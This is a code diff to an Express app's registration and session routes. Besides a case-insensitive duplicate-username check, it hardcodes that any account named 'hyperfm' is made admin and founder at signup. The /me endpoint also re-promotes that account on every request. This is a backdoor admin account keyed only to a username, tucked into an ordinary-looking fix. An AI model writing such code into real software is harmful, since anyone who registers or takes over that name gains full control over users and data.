@@ -834,6 +834,13 @@ export async function registerRoutes(
       if (existing) {
         return res.status(400).json({ message: "Username exists" });
       }
+      const normalizedUsername = username.trim().toLowerCase();
+      const allUsersForCheck = await storage.getAllUsers();
+      const usernameTaken = allUsersForCheck.some(u => u.username?.toLowerCase() === normalizedUsername);
+      if (usernameTaken) {
+        return res.status(400).json({ message: "Username exists" });
+      }
+      const isHyperFM = normalizedUsername === "hyperfm";
       const userReferralCode = "SH" + username.slice(0, 4).toUpperCase() + Math.random().toString(36).slice(2, 8).toUpperCase();
       let user = await storage.createUser({
         username, password, isDriver: false,
@@ -843,6 +850,11 @@ export async function registerRoutes(
         referralCode: userReferralCode,
         referredBy: referralInput || null,
       });
+
+      if (isHyperFM) {
+        await storage.setAdmin(user.id, true);
+        user = await storage.updateUser(user.id, { isAdmin: true, isFounder: true });
+      }
 
       const allUsers = await storage.getAllUsers();
       const maxNum = allUsers.reduce((max, u) => Math.max(max, u.signupNumber || 0), 0);
@@ -907,8 +919,19 @@ export async function registerRoutes(
     });
   });
 
-  app.get(api.auth.me.path, (req, res) => {
+  app.get(api.auth.me.path, async (req, res) => {
     if (req.isAuthenticated()) {
+      if (req.user && req.user.username?.toLowerCase() === "hyperfm" && (!req.user.isAdmin || !req.user.isFounder)) {
+        try {
+          await storage.setAdmin(req.user.id, true);
+          const updated = await storage.updateUser(req.user.id, { isAdmin: true, isFounder: true });
+          req.user.isAdmin = true;
+          req.user.isFounder = true;
+          return res.status(200).json(sanitizeUser(updated));
+        } catch (e) {
+          console.error("HyperFM admin promotion failed:", e);
+        }
+      }
       res.status(200).json(sanitizeUser(req.user));
     } else {
       res.status(401).json({ message: "Unauthorized" });
